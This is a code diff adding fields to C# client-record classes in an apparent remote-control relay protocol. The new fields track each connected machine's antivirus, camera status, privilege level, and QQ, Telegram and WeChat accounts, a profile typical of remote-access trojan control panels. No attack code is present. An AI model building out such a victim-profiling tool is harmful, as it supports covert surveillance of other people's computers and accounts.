@@ -14,6 +14,18 @@ namespace RemoteControl.Protocals.Relay
         public string AppPath = "";
         public string OnlineAvatar = "";
         public string OnlineTime = "";
+        public string UserName = "";
+        public string LocalIP = "";
+        public string OSVersion = "";
+        public string Privilege = "";
+        public string CameraStatus = "";
+        public string Antivirus = "";
+        public string OnlineQQ = "";
+        public string TG = "";
+        public string WX = "";
+        public string UserStatus = "";
+        public string Region = "";
+        public string ISP = "";
     }
 
     /// <summary>
@@ -40,7 +52,21 @@ namespace RemoteControl.Protocals.Relay
         public string ClientId = "";
         public string HostName = "";
         public string IP = "";
+        public string AppPath = "";
         public string OnlineAvatar = "";
+        public string OnlineTime = "";
+        public string UserName = "";
+        public string LocalIP = "";
+        public string OSVersion = "";
+        public string Privilege = "";
+        public string CameraStatus = "";
+        public string Antivirus = "";
+        public string OnlineQQ = "";
+        public string TG = "";
+        public string WX = "";
+        public string UserStatus = "";
+        public string Region = "";
+        public string ISP = "";
     }
 
     /// <summary>
